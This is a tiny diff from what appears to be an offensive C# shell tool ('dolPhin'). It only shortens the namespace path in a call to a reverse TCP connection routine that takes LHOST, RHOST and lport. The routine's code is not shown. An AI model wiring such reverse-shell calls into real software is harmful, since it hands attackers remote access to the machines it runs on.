@@ -45,7 +45,7 @@ namespace dolPhin.shell.Command
 
                 if (contin)
                 {
-                    Command.cmds.reversetcp.reversetcpconnection.run(LHOST, RHOST, lport);
+                    cmds.reversetcp.reversetcpconnection.run(LHOST, RHOST, lport);
                 }
             }
             else { 
